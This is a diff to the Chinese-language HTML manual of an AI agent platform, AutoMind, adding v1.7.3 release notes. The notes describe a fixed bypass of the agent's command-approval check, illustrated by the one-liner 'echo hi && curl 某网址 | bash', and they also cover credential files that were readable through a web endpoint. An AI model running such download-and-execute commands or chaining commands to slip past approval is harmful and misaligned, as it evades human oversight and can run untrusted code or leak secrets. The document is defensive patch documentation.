@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AutoMind 使用手册 — v1.7.2</title>
+<title>AutoMind 使用手册 — v1.7.3</title>
 <style>
 :root{
   --bg0:#060913; --bg1:rgba(14,18,32,.72); --bg2:rgba(22,28,46,.65); --bg3:rgba(31,39,64,.8);
@@ -184,7 +184,7 @@ footer{margin-top:80px;padding-top:26px;border-top:1px solid var(--border);
 <!-- ═══════ 目录 ═══════ -->
 <nav id="toc">
   <div class="logo">⬢ AutoMind</div>
-  <div class="ver">使用手册 · v1.7.2</div>
+  <div class="ver">使用手册 · v1.7.3</div>
   <input id="toc-search" type="search" placeholder="🔍 搜索目录…" autocomplete="off"
     style="width:100%;margin:0 0 10px;padding:7px 10px;border:1px solid var(--border);
     border-radius:8px;background:rgba(255,255,255,.04);color:var(--text,#e8ecf6);
@@ -222,7 +222,7 @@ footer{margin-top:80px;padding-top:26px;border-top:1px solid var(--border);
   <h1>AutoMind 使用手册</h1>
   <div class="sub">会自己动手干活的 AI 智能体平台 — 零基础入门 · 功能深度解读 · 场景指南</div>
   <div class="chips">
-    <span class="chip">版本 <b>v1.7.2</b></span>
+    <span class="chip">版本 <b>v1.7.3</b></span>
     <span class="chip" style="border-color:#c9a22766;color:#c9a227">🏷 社区版 / 专业版 / 企业版</span>
     <span class="chip">🖥 本地运行 · 数据不上传</span>
     <span class="chip">🛡 全程审批与审计</span>
@@ -942,7 +942,7 @@ automind --list-skills    automind --list-providers</code></pre>
   <p>不带参数运行 <code>automind</code> 进入：</p>
   <div class="card" style="font-family:var(--mono);font-size:.84em;background:#0a0e1c">
     <span style="color:#7b9fff">┌──────────────── REPL ────────────────┐</span><br>
-    <span style="color:#7b9fff">│</span> <b style="color:#7b9fff">AutoMind</b> <span style="color:#6b7591">v1.7.2</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7b9fff">│</span><br>
+    <span style="color:#7b9fff">│</span> <b style="color:#7b9fff">AutoMind</b> <span style="color:#6b7591">v1.7.3</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7b9fff">│</span><br>
     <span style="color:#7b9fff">│</span> 模式: <span style="color:#f5c542">plan_and_execute</span> · 模型: <span style="color:#3ce68a">deepseek/…</span> <span style="color:#7b9fff">│</span><br>
     <span style="color:#7b9fff">│</span> 输入任务开始，<b>/help</b> 查看命令&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7b9fff">│</span><br>
     <span style="color:#7b9fff">└──────────────────────────────────────┘</span><br>
@@ -1062,8 +1062,43 @@ automind --list-skills    automind --list-providers</code></pre>
 
 <div class="cl-item">
     <div class="cl-head">
-      <span class="cl-ver">v1.7.2</span><span class="cl-date">2026-09-16</span>
+      <span class="cl-ver">v1.7.3</span><span class="cl-date">2026-09-17</span>
       <span class="cl-badge">当前版本</span>
+    </div>
+    <div class="cl-sum">把"写了但没通电"的地方接上，并补上交付真正缺的四件事</div>
+    <ul>
+      <li><b>🧮 成本预算这回是真的在管</b>：后台记账写错了一个字段名、异常被吞掉，
+        于是用量预警与超额拦截<b>从未触发</b>——界面数字照跳，预算看到的却一直是 0，
+        账单与上下文都没有上限。现在记账收敛到一处，并加了静态检查让这类错误当场暴露。</li>
+      <li><b>🛡 命令审批不再被"安全前缀"绕过</b>：以前在危险命令前垫一个无害命令
+        （<code>echo hi &amp;&amp; curl 某网址 | bash</code>）整串就会被判成安全并执行。
+        现在按连接符<b>拆段分别判断</b>，下载即执行/编码混淆/读系统凭据文件一律要确认；
+        日常命令不受影响。</li>
+      <li><b>🔒 密钥与数据文件不能再从网页读走</b>：编辑器端点此前只查"在不在项目目录里"，
+        而平台配置（含全部 API Key）就在那里。现在这类文件与 <code>.env</code>、
+        <code>.ssh</code>、<code>*.pem</code> 在网页端一律拒绝；Agent 自己的文件工具
+        仍可读你项目里的 <code>.env</code>。</li>
+      <li><b>🔑 管理动作与日常操作分了权</b>：改配置/加 MCP/加载插件/触发更新/回执审批/
+        清空审计只允许本机执行；远程需设置 <code>AUTOMIND_ADMIN_TOKEN</code> 并在
+        「设置 → Agent 集成 → 管理员令牌」填一次。</li>
+      <li><b>📊 运维能接监控了</b>：新增 <code>/metrics</code>（Prometheus 格式，零新依赖）
+        与 <code>/api/health/ready</code>（真检查数据库/磁盘/目录，坏了返回 503）。</li>
+      <li><b>🔌 连接器</b>：把 <code>~/.automind/connectors/xxx.py</code> 放进去，里面的工具
+        就会出现在 AI 的可选工具里，不改代码、不重启；坏文件会在「注册状态」里说明原因。</li>
+      <li><b>📋 评测与重放</b>：<code>AUTOMIND_REPLAY=1</code> 记录每次模型调用的完整输入输出，
+        可照着重跑比对；<code>python -m automind.eval run smoke</code> 跑内置套件并给出
+        通过率、耗时与成本；没配 Key 时明确报"无法评测"。</li>
+      <li><b>📣 出站通知与外部审批</b>：任务与审批事件可推到工单/IM（带 HMAC 签名）；
+        审批也能在外部系统里批（<code>POST /api/approvals/{id}</code>，需管理员令牌）。</li>
+      <li><b>📄 工作流即代码</b>：把流程写成 YAML（工具步骤/模型步骤/人工卡点/条件分支），
+        可评审、可版本化、可进 CI；<code>--dry-run</code> 只看会做什么。</li>
+    </ul>
+  </div>
+
+<div class="cl-item">
+    <div class="cl-head">
+      <span class="cl-ver">v1.7.2</span><span class="cl-date">2026-09-16</span>
+      <span class="cl-badge">上一版</span>
     </div>
     <div class="cl-sum">AI 回答到一半，你可以随时插一句话</div>
     <ul>
@@ -1592,7 +1627,7 @@ automind --list-skills    automind --list-providers</code></pre>
 </section>
 
 <footer>
-  AutoMind 使用手册 · 与软件 v1.7.2 同步 ·
+  AutoMind 使用手册 · 与软件 v1.7.3 同步 ·
   遇到手册未覆盖的问题，可在 💬 对话模式里直接问 AutoMind 本身
 </footer>
 
